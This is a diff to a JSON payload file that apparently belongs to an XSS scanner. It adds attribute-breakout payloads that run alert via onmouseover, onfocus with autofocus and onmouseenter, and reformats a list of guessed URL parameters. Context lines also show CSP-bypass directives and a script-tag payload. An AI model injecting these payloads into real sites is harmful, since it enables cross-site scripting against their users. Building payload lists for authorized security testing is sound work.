@@ -1,6 +1,14 @@
 {
     "XSS_PAYLOADS": [
         [
+            "\" onmouseover=\"alert(1)",
+            "attr-breakout-double"
+        ],
+        [
+            "' onmouseover='alert(1)",
+            "attr-breakout-single"
+        ],
+        [
             "<script>alert(\"{c}\")</script>",
             "script-tag"
         ],
@@ -382,6 +390,32 @@
             "onclick-dec-entity"
         ]
     ],
+    "ATTRIBUTE_ESCAPE_PAYLOADS": [
+        [
+            "\"{c}\" onmouseover=\"alert({c})",
+            "attr-escape-double-mouseover"
+        ],
+        [
+            "'{c}' onmouseover='alert({c})",
+            "attr-escape-single-mouseover"
+        ],
+        [
+            "\"{c}\" onfocus=\"alert({c})\" autofocus=\"",
+            "attr-escape-autofocus"
+        ],
+        [
+            "\"{c}\" onmouseenter=\"alert({c})",
+            "attr-escape-mouseenter"
+        ],
+        [
+            "x\" onmouseover=\"alert(1)",
+            "attr-escape-simple-double"
+        ],
+        [
+            "x' onmouseover='alert(1)",
+            "attr-escape-simple-single"
+        ]
+    ],
     "CSP_BYPASS_DIRECTIVES": [
         [
             ";script-src-elem 'unsafe-inline'",
@@ -431,5 +465,25 @@
         "confirm(",
         "prompt("
     ],
-    "GUESS_PARAMS": ["q", "search", "query", "input", "name", "redirect", "url", "next", "returnUrl", "returnPath", "return_url", "redirect_uri", "callback", "continue", "dest", "storeId", "store", "default", "page"]
+    "GUESS_PARAMS": [
+        "q",
+        "search",
+        "query",
+        "input",
+        "name",
+        "redirect",
+        "url",
+        "next",
+        "returnUrl",
+        "returnPath",
+        "return_url",
+        "redirect_uri",
+        "callback",
+        "continue",
+        "dest",
+        "storeId",
+        "store",
+        "default",
+        "page"
+    ]
 }
